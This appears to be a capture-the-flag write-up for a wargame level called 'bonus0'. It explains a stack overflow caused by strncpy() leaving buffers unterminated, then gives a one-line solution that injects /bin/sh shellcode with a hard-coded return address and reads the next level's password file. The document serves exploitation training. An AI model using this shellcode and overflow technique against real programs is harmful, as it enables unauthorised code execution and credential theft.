## Vulnerability Overview

* **Type:** Stack Overflow / Buffer Overflow
* **Core Issue:** The program utilizes `strncpy()` to copy a fixed number of bytes ($n$) from user input into stack buffers without manually appending a null terminator (`\0`) if the input equals or exceeds $n$. Subsequent calls to standard string functions like `strcpy()` and `strcat()` inside `pp()` rely on finding a null terminator, causing them to read and write past the intended boundaries.

------

## Program Structure

The program reads input using a helper function (commonly named `p()`) which prompts the user twice. It uses `strncpy()` to pull up to 20 bytes for each buffer:

// Inside p()
strncpy(dest, input, 20); // Does not null-terminate if input >= 20 bytes

# # Solution
`(python -c 'print("A"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'; python -c 'print("A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 8)'; echo "cat /home/user/bonus1/.pass") | ./bonus0`